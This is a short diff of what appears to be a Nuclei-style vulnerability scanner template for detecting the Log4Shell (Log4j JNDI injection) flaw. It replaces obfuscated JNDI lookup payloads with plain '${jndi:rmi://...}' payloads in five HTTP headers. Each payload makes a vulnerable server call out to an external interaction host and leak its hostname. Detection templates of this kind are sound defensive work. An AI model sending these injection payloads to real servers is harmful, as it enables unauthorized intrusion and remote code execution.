@@ -16,11 +16,12 @@ requests:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        Authentication: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        User-Agent: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        X-Api-Version: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        Referer: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
-        X-Forwarded-For: ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{{interactsh-url}}/poc}
+        User-Agent: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        X-Api-Version: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        Referer: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        X-Forwarded-For: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        Authentication: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+
 
 
 
